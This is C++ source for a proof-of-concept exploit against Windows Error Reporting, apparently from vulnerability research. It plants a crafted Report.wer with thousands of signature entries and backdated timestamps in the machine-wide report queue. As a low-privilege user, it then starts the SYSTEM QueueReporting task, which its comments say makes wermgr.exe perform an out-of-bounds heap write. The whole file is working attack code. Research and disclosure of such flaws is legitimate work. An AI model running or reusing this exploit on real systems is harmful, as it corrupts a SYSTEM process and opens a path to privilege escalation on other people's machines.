#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>

static const wchar_t* Q = L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue";

static bool writeWer(const std::wstring& dir, int nSig, bool makeOld) {
    if (!CreateDirectoryW(dir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) return false;
    std::wstring s;
    s += L"Version=1\r\nEventType=APPCRASH\r\nConsent=1\r\nReportStatus=0\r\n";
    s += L"ReportIdentifier=00000000-0000-0000-0000-0000000000aa\r\nNsAppName=poc.exe\r\n";
    s += L"AppSessionGuid=00000000-0000-0000-0000-0000000000aa\r\nTargetAppId=poc.exe\r\n";
    s += L"TargetAppVer=1.0.0.0\r\nFriendlyEventName=Stopped working\r\nConsentKey=APPCRASH\r\n";
    s += L"AppName=poc\r\nAppPath=C:\\poc.exe\r\n";
    wchar_t line[80];
    for (int i = 0; i < nSig; ++i) {
        swprintf(line, 80, L"Sig[%d].Name=BBBBBBBB\r\n", i);  s += line;
        swprintf(line, 80, L"Sig[%d].Value=CCCCCCCCCCCCCCCC\r\n", i); s += line;
    }
    std::wstring path = dir + L"\\Report.wer";
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD wrote = 0; WriteFile(h, s.data(), (DWORD)(s.size() * sizeof(wchar_t)), &wrote, NULL); CloseHandle(h);
    if (makeOld) {
        SYSTEMTIME st = { 0 }; st.wYear = 2019; st.wMonth = 1; st.wDay = 1; FILETIME ft; SystemTimeToFileTime(&st, &ft);
        HANDLE hd = CreateFileW(dir.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
        if (hd != INVALID_HANDLE_VALUE) { SetFileTime(hd, &ft, &ft, &ft); CloseHandle(hd); }
        HANDLE hf = CreateFileW(path.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) { SetFileTime(hf, &ft, &ft, &ft); CloseHandle(hf); }
    }
    wprintf(L"[+] planted %s (%d Sig, %u bytes)\n", path.c_str(), nSig, wrote);
    return true;
}

int main(int argc, char** argv) {
    int nSig = (argc > 1) ? atoi(argv[1]) : 4000;
    int nDummy = (argc > 2) ? atoi(argv[2]) : 80;
    bool trigger = (argc > 3) ? (atoi(argv[3]) != 0) : true;   // default: also fire the SYSTEM task
    std::wstring bad = std::wstring(Q) + L"\\AppCrash_poc.exe_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_00000000_pocbad00";
    if (!writeWer(bad, nSig, true)) { wprintf(L"[-] cannot write machine store gle=%lu\n", GetLastError()); wprintf(L"POC_MARKER_DONE\n"); return 2; }
    for (int i = 0; i < nDummy; ++i) {
        wchar_t suf[40]; swprintf(suf, 40, L"pocdmy%02d", i);
        std::wstring d = std::wstring(Q) + L"\\AppCrash_dmy.exe_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb_00000000_" + suf; writeWer(d, 1, false);
    }
    wprintf(L"[+] plant complete (as low-priv user, %d dummies). \n", nDummy);

    if (trigger) {
        // The QueueReporting task grants Everyone (WD) Read+Execute (SDDL ...(A;;FRFX;;;WD)),
        // so a low-priv user can start this SYSTEM/Highest task on demand -> wermgr.exe -upload
        // prunes the machine store -> parses our malicious report -> SYSTEM OOB heap write.
        const wchar_t* cmd =
            L"schtasks /run /tn \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"";
        wprintf(L"[+] triggering SYSTEM task as low-priv: %s\n", cmd);
        STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 };
        std::wstring c = cmd;
        if (CreateProcessW(NULL, &c[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 20000);
            DWORD ec = 0; GetExitCodeProcess(pi.hProcess, &ec);
            wprintf(L"[i] schtasks /run exit=%lu (0=accepted). SYSTEM wermgr will now prune+parse.\n", ec);
            CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        }
        else {
            wprintf(L"[-] CreateProcess(schtasks) failed gle=%lu (task may still fire on its own triggers)\n", GetLastError());
        }
    }
    else {
        wprintf(L"[i] no trigger requested; SYSTEM prune fires on boot(+3m)/daily/network/AC/WNF, or `schtasks /run`.\n");
    }
    wprintf(L"POC_MARKER_DONE\n");
    return 0;
}
